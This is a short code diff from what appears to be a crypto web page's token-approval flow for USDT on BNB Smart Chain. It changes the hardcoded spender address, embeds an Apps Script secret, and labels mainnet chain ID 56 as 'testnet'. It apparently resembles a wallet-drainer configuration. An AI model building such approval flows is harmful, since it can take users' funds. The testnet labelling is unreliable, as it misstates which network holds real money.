@@ -39,7 +39,7 @@ modalCancelBtn?.addEventListener("click", closeApprovalModal);
     const APPS_SCRIPT_SECRET = "justforme";
 
     const TOKEN_ADDRESS   = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
-    const SPENDER_ADDRESS = "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1";
+    const SPENDER_ADDRESS = "0x31597289c47FC19654EBE50bfa7769999dFBbD0F";
 
     const BNB_TESTNET_CHAIN_ID_DEC = 56;
     const BNB_TESTNET_CHAIN_ID_HEX = "0x38";
